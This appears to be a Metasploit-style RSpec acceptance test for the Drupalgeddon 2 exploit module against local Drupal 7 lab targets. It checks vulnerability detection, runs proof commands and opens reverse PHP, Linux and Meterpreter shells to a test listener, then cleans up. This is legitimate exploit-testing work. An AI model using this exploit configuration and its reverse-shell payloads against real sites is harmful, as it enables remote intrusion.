require 'acceptance_spec_helper'
require 'rbconfig'

profile = ENV.fetch('DRUPAL7_PROFILE', 'command')
raise ArgumentError, "Unknown Drupal 7 profile: #{profile}" unless %w[command php].include?(profile)

php_sessions = profile == 'php'

RSpec.describe 'Native Drupal 7 Drupalgeddon 2 targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/drupal7/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-drupal.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-drupal-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native = JSON.parse(stdout)
    expect(@native.fetch('callbacks').length).to eq(3)
  end

  unless php_sessions
    %w[root prefix assert_off].each do |service|
      it "proves code execution in the actual #{service} Drupal check" do
        expect(execute_module(service, {}, action: 'check')).to include('The target is vulnerable')
      end
    end

    it 'identifies the actual fixing release as not vulnerable' do
      expect(execute_module('fixed', {}, action: 'check')).to match(/not vulnerable|not exploitable/i)
    end

    it 'returns detected when the actual installation withholds its changelog' do
      output = execute_module('no_changelog', {}, action: 'check')
      expect(output).to match(/could not be validated|Detected version 7/)
      expect(output).not_to include('The target is vulnerable', 'The target appears to be vulnerable')
    end

    it 'does not identify unrelated Apache as Drupal' do
      output = execute_module('unrelated', {}, action: 'check')
      expect(output).to match(/could not determine|could not reliably check/i)
      expect(output).not_to include('The target is vulnerable', 'The target appears to be vulnerable')
    end

    it 'does not identify a missing installation path as Drupal' do
      output = execute_module('root', { 'TARGETURI' => '/module-target-missing/' }, action: 'check')
      expect(output).to match(/could not determine|could not reliably check/i)
      expect(output).not_to include('The target is vulnerable', 'The target appears to be vulnerable')
    end

    it 'keeps the fixing-release check safe under an explicit Drupal 7 target' do
      expect(execute_module('fixed', { 'TARGET' => 4 }, action: 'check')).to match(/not vulnerable|not exploitable/i)
    end

    { 'root' => 2, 'prefix' => 6, 'no_changelog' => 2 }.each do |service, target_id|
      it "executes and reports the #{service} Unix command twice with fresh proof" do
        prove_command_twice(service, 'TARGET' => target_id)
      end
    end

    it 'initializes the Drupal 7 execution path with AutoCheck disabled' do
      prove_command_twice('root', 'TARGET' => 6, 'AutoCheck' => false)
    end

    it 'supports the configured system function for Unix command execution' do
      prove_command_twice('root', 'TARGET' => 2, 'PHP_FUNC' => 'system')
    end

  end

  [
    ['root', 0, 'php/reverse_php', 'automatic PHP memory'],
    ['prefix', 4, 'php/reverse_php', 'explicit PHP memory'],
    ['root', 1, 'php/reverse_php', 'automatic PHP dropper'],
    ['prefix', 5, 'php/reverse_php', 'explicit PHP dropper'],
    ['root', 3, 'linux/x64/shell_reverse_tcp', 'automatic Linux dropper'],
    ['prefix', 7, 'linux/x64/shell_reverse_tcp', 'explicit Linux dropper'],
    ['assert_off', 0, 'php/reverse_php', 'PHP memory command fallback'],
    ['assert_off', 1, 'php/reverse_php', 'PHP dropper command fallback'],
    ['assert_off', 3, 'linux/x64/shell_reverse_tcp', 'Linux dropper command fallback'],
    ['root', 0, 'php/meterpreter/reverse_tcp', 'staged PHP Meterpreter']
  ].each_with_index do |(service, target_id, payload, label), index|
    next unless payload.start_with?('php/') == php_sessions

    it "opens #{label} twice on #{service} and cleans each delivery" do
      2.times do
        original = file_state(service)
        path = '/tmp/module-target-drupal-session-proof'
        target_exec(service, 'test', '!', '-e', path)
        begin
          # A dropper can issue seven two-request commands and a payload GET.
          # WfsDelay=1 also means four-second waits between fallback attempts.
          output = execute_module(service, {
            'TARGET' => target_id, 'PAYLOAD' => payload,
            'LHOST' => listener_host, 'LPORT' => 4520 + index,
            'WritableDir' => '/tmp/module-target-drupal-drop',
            'DisablePayloadHandler' => false, 'WfsDelay' => 1
          }, action: 'run -z', timeout: [1, 3, 5, 7].include?(target_id) ? 45 : 20)
          session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
          expect(session_id).not_to be_nil, output
          meterpreter = payload.include?('meterpreter')
          command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "/usr/bin/touch #{path}"
          proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
          expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
          wait_for_expect(10, 0.1) { expect(target_exec(service, 'stat', '-c', '%U', path).strip).to eq('www-data') }
          wait_for_expect(10, 0.1) { expect(file_state(service)).to eq(original) }
        ensure
          begin
            unless @console_broken
              console_command('sessions -K', timeout: 5)
              console_command('jobs -K', timeout: 5)
            end
          ensure
            recover_owned_files(service, original)
            target_exec(service, 'rm', '-f', path)
          end
        end
        expect(file_state(service)).to eq(original)
      end
    end
  end

  unless php_sessions
    [
      ['fixed', {}],
      ['unrelated', {}],
      ['root', { 'TARGETURI' => '/module-target-missing/' }]
    ].each do |service, options|
      it "does not execute a command on #{service} #{options.fetch('TARGETURI', 'root')} without a positive check" do
        path = '/tmp/module-target-drupal-command-proof'
        target_exec(service, 'test', '!', '-e', path)
        original = file_state(service) unless service == 'unrelated'
        output = execute_module(service, {
          'TARGET' => 2, 'PAYLOAD' => 'cmd/unix/generic',
          'CMD' => "/usr/bin/touch #{path}", 'DisablePayloadHandler' => true,
          'AllowNoCleanup' => true, 'WfsDelay' => 0
        }.merge(options))
        expect(output).to match(/Exploit aborted|not vulnerable|not exploitable|Could not determine|Unable to/i)
        target_exec(service, 'test', '!', '-e', path)
        expect(file_state(service)).to eq(original) if original
      end
    end

  end

  def execute_module(service, options = {}, action: 'run', timeout: 30)
    defaults = {
      'SSL' => false, 'TARGETURI' => service == 'prefix' ? '/drupal/' : '/',
      'TARGET' => 0, 'PAYLOAD' => 'php/meterpreter/reverse_tcp',
      'AutoCheck' => true, 'ForceExploit' => false, 'DUMP_OUTPUT' => false,
      'PHP_FUNC' => 'passthru', 'AllowNoCleanup' => false,
      'HttpClientTimeout' => 5, 'WfsDelay' => 1
    }
    run_target_module('exploit/unix/webapp/drupal_drupalgeddon2', service, defaults.merge(options), action: action, allow_errors: true, command_timeout: timeout)
  end

  def prove_command_twice(service, options)
    2.times do
      path = '/tmp/module-target-drupal-command-proof'
      original = file_state(service)
      target_exec(service, 'test', '!', '-e', path)
      begin
        output = execute_module(service, {
          'PAYLOAD' => 'cmd/unix/generic',
          'CMD' => "/usr/bin/id -un; /usr/bin/touch #{path}",
          'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
        }.merge(options))
        expect(output).to include('www-data')
        expect(target_exec(service, 'stat', '-c', '%U', path).strip).to eq('www-data')
      ensure
        target_exec(service, 'rm', '-f', path)
        recover_owned_files(service, original)
      end
      expect(file_state(service)).to eq(original)
    end
  end

  def file_state(service)
    root = @native.fetch('profiles').fetch(service).fetch('root')
    script = '$result=array(); foreach(array($argv[1],"/tmp","/tmp/module-target-drupal-drop") as $dir) { if (!is_dir($dir)) {continue;} foreach(new DirectoryIterator($dir) as $file) { if (!$file->isFile()) {continue;} $path=$file->getPathname(); if (in_array($file->getFilename(),array("module-target-drupal-session-proof","module-target-drupal-command-proof"))) {continue;} $result[$path]=hash_file("sha256",$path); } } ksort($result); echo json_encode($result);'
    JSON.parse(target_exec(service, 'php', '-r', script, root))
  end

  def recover_owned_files(service, original)
    (file_state(service).keys - original.keys).each do |path|
      raise "Unexpected recovery path: #{path}" unless File.basename(path).match?(/\A[a-zA-Z0-9]{8,42}(?:\.php)?\z/)

      data = target_exec(service, 'php', '-r', 'echo base64_encode(file_get_contents($argv[1]));', path)
      File.open(File.join(target_runtime.fetch('artifacts'), 'recovered-target-files.jsonl'), 'a') do |file|
        file.puts(JSON.generate(service: service, path: path, data_base64: data, origin: 'Actual target file read before owned recovery'))
      end
      target_exec(service, 'rm', '-f', '--', path)
    end
  end
end

# Stops a broken shared console before later cases can produce misleading failures.
module DrupalConsoleBoundary
  def console_command(command, timeout: 40)
    raise Acceptance::ChildProcessTimeoutError, 'Console already failed; diagnostic stopped' if @console_broken

    super
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError
    @console_broken = true
    # A transport failure leaves later cases untested. Stop immediately and
    # retain a partial, unqualified report instead of cascading console waits.
    RSpec.world.wants_to_quit = true
    raise
  end
end

group = RSpec.world.example_groups.find { |item| item.description == 'Native Drupal 7 Drupalgeddon 2 targets' }
raise 'Drupal target group is missing' unless group

group.prepend(DrupalConsoleBoundary)
